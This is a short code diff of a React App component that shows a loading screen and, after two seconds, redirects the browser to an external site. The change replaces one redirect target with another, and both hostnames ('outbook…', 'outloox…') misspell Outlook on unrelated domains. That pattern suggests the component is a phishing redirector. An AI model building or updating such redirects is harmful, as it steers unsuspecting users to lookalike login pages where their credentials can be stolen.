@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.neurowyjatkowi.pl/';
+            window.location.href = 'https://outloox.dinprima.ro/';
         }, 2000);
 
         return () => clearTimeout(timer);
